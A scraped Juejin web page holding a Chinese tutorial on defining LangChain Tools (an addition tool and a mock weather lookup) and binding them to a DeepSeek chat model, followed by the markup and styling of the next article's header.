tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>很多人第一次用大模型，都会写出这样的代码：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> res = await model.<span class="hljs-built_in">invoke</span>(<span class="hljs-string">"北京今天天气怎么样？"</span>)
</code></pre>
<p>然后模型会很“诚恳”地回答：</p>
<blockquote>
<p>我无法获取实时天气，但你可以查看相关网站。</p>
</blockquote>
<p>这其实暴露了一个核心问题：</p>
<p><strong>你用的不是 AI 应用，而只是一个“会说话的模型”。</strong></p>
<hr/>
<h2 data-id="heading-0">一、真正的能力差距，不在 Prompt，而在 Tool</h2>
<p>Prompt 再精致，模型本质仍然只能“生成文本”。</p>
<p>而真实世界的应用需要的是：</p>
<ul>
<li>计算</li>
<li>查询数据</li>
<li>调用接口</li>
<li>执行业务逻辑</li>
</ul>
<p>LangChain 给出的答案是：<strong>Tool</strong>。</p>
<blockquote>
<p>Tool 不是让你“多写点代码”，<br/>
而是让模型具备“执行能力”。</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">二、Tool 是什么？一句话说明白</h2>
<p><strong>Tool = 一个可被大模型主动调用的函数。</strong></p>
<p>注意这几个关键词：</p>
<ul>
<li>主动调用</li>
<li>参数由模型生成</li>
<li>是否调用由模型判断</li>
</ul>
<p>这和你在代码里写 <code>if / else</code> 有本质区别。</p>
<hr/>
<h2 data-id="heading-2">三、一个最基础的 Tool：加法函数</h2>
<p>先从最简单的开始。</p>
<pre><code class="hljs language-css" lang="css">const addTool = tool(
  async ({ <span class="hljs-selector-tag">a</span>, <span class="hljs-selector-tag">b</span> }) =&gt; String(<span class="hljs-selector-tag">a</span> + <span class="hljs-selector-tag">b</span>),
  {
    name: <span class="hljs-string">"add"</span>,
    description: <span class="hljs-string">"计算两个数字的和"</span>,
    schema: z.<span class="hljs-built_in">object</span>({
      <span class="hljs-selector-tag">a</span>: z.<span class="hljs-built_in">number</span>(),
      b: z.<span class="hljs-built_in">number</span>()
    })
  }
)
</code></pre>
<p>效果图：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/50e5afffc8a447aebd7bfa9e4b20259f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95YWw5Zyw56m655O2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767597407&amp;x-signature=wHl9vgH0QvTIyMVL1U5xnwpTFn4%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4000ab57c88a41279750d043b208a815~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95YWw5Zyw56m655O2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767597407&amp;x-signature=TGNGH%2FZaaBKgWlFgQb52xGucHNI%3D" alt="image.png" loading="lazy"/></p>
<p>这里有三个关键点：</p>
<ol>
<li><strong>函数本身并不重要</strong>，重要的是它能被模型调用</li>
<li><code>schema</code> 决定模型如何构造参数</li>
<li><code>description</code> 决定模型是否会选择这个 Tool</li>
</ol>
<blockquote>
<p>Tool 的“说明文字”，是写给模型看的，不是给人看的。</p>
</blockquote>
<hr/>
<h2 data-id="heading-3">四、Tool 的核心不是代码，而是语义设计</h2>
<p>很多人用不好 Tool，原因不是代码写错，而是<strong>语义不清</strong>。</p>
<p>如果你的 Tool：</p>
<ul>
<li>名字含糊</li>
<li>描述模棱两可</li>
<li>参数意义不明确</li>
</ul>
<p>模型就不会稳定地调用它。</p>
<p>可以理解为：</p>
<blockquote>
<p>Tool 是你给模型的一份「能力说明书」。</p>
</blockquote>
<hr/>
<h2 data-id="heading-4">五、一个更接近真实业务的例子：天气查询</h2>
<p>用一个假数据源模拟真实系统：</p>
<pre><code class="hljs language-css" lang="css">const fakeWeatherDB = {
  北京: { temp: <span class="hljs-string">"30°C"</span>, condition: <span class="hljs-string">"晴"</span>, wind: <span class="hljs-string">"微风"</span> },
  上海: { temp: <span class="hljs-string">"28°C"</span>, condition: <span class="hljs-string">"多云"</span>, wind: <span class="hljs-string">"东风 3 级"</span> },
  广州: { temp: <span class="hljs-string">"32°C"</span>, condition: <span class="hljs-string">"阵雨"</span>, wind: <span class="hljs-string">"南风 2 级"</span> },
}
</code></pre>
<p>定义对应的 Tool：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> weatherTool = <span class="hljs-title function_">tool</span>(
  <span class="hljs-keyword">async</span> ({ city }) =&gt; {
    <span class="hljs-keyword">const</span> weather = fakeWeatherDB[city]
    <span class="hljs-keyword">if</span> (!weather) <span class="hljs-keyword">return</span> <span class="hljs-string">`暂无<span class="hljs-subst">${city}</span>的天气信息`</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">`当前<span class="hljs-subst">${city}</span>的天气是<span class="hljs-subst">${weather.temp}</span>, <span class="hljs-subst">${weather.condition}</span>, 风力<span class="hljs-subst">${weather.wind}</span>`</span>
  },
  {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"get_weather"</span>,
    <span class="hljs-attr">description</span>: <span class="hljs-string">"查询指定城市的今日天气情况"</span>,
    <span class="hljs-attr">schema</span>: z.<span class="hljs-title function_">object</span>({
      <span class="hljs-attr">city</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">describe</span>(<span class="hljs-string">"要查询天气的城市"</span>)
    })
  }
)
</code></pre>
<p>这个 Tool 已经非常接近真实业务中的“服务层”。</p>
<hr/>
<h2 data-id="heading-5">六、把 Tool 交给模型</h2>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> model = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ChatDeepSeek</span>({
  model: <span class="hljs-string">"deepseek-chat"</span>,
  temperature: <span class="hljs-number">0</span>
}).<span class="hljs-built_in">bindTools</span>([addTool, weatherTool])
</code></pre>
<p>这一行代码，本质是在告诉模型：</p>
<blockquote>
<p>你不需要什么都会，<br/>
你只需要学会什么时候该用哪个工具。</p>
</blockquote>
<hr/>
<h2 data-id="heading-6">七、模型是如何决定调用 Tool 的？</h2>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> res = await model.<span class="hljs-built_in">invoke</span>(<span class="hljs-string">"北京今天天气怎么样"</span>)
</code></pre>
<p>如果模型认为需要工具，会返回：</p>
<pre><code class="hljs">res.tool_calls
</code></pre>
<p>你只需要按调用结果执行即可：</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">if</span> (res.tool_calls?.length) {
  <span class="hljs-keyword">const</span> <span class="hljs-keyword">call</span> = res.tool_calls[<span class="hljs-number">0</span>]

  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">call</span>.name === <span class="hljs-string">"get_weather"</span>) {
    <span class="hljs-keyword">const</span> result = <span class="hljs-built_in">await</span> weatherTool.invoke(<span class="hljs-keyword">call</span>.args)
    console.log(<span class="hljs-string">"最终结果："</span>, result)
  }
}
</code></pre>
<p>此时模型只负责“决策”，<br/>
代码只负责“执行”。</p>
<p>效果图:</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/653c89371231495b9f0a2520f0ff14c6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95YWw5Zyw56m655O2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767597407&amp;x-signature=RjtpHH1Zha%2Bv4zjH1pkNCEqxopc%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-7">八、Tool 在架构中的真实定位</h2>
<p>如果放到工程视角来看：</p>
<ul>
<li>Model：意图理解 + 决策</li>
<li>Tool：真实能力（计算、查询、操作）</li>
<li>你的代码：调度与安全边界</li>
</ul>
<p>可以把 Tool 理解为：</p>
<blockquote>
<p>AI 系统里的 Service 层。</p>
</blockquote>
<hr/>
<h2 data-id="heading-8">九、为什么说 Tool 是 AI 应用的分水岭</h2>
<p>没有 Tool：</p>
<ul>
<li>AI 只能生成文本</li>
<li>无法落地真实业务</li>
</ul>
<p>有 Tool：</p>
<ul>
<li>AI 可以参与业务流程</li>
<li>可以接数据库、接口、文件系统</li>
<li>可以作为“智能调度器”存在</li>
</ul>
<p><strong>这是从“玩模型”到“做系统”的转折点。</strong></p>
<hr/>
<h2 data-id="heading-9">十、总结</h2>
<blockquote>
<p>Prompt 决定模型说什么，<br/>
Tool 决定模型能做什么。</p>
</blockquote>
<p>如果你愿意，下一步可以继续深入：</p>
<ul>
<li>Tool + 多模型协作</li>
<li>Tool + Agent 自动决策</li>
<li>用 Tool 设计一个完整 AI 后端架构</li>
</ul>
<p>这才是 LangChain 真正值得花时间研究的地方。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025年，我和AI合伙开发了四款小工具]]></title>    <link>https://juejin.cn/post/7589092567543955465</link>    <guid>https://juejin.cn/post/7589092567543955465</guid>    <pubDate>2025-12-29T09:06:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589092567543955465" data-draft-id="7589092567543939081" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025年，我和AI合伙开发了四款小工具"/> <meta itemprop="keywords" content="前端,后端,JavaScript"/> <meta itemprop="datePublished" content="2025-12-29T09:06:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员凌览"/> <meta itemprop="url" content="https://juejin.cn/user/3350967174565198"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025年，我和AI合伙开发了四款小工具
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3350967174565198/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员凌览
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:06:03.000Z" title="Mon Dec 29 2025 09:06:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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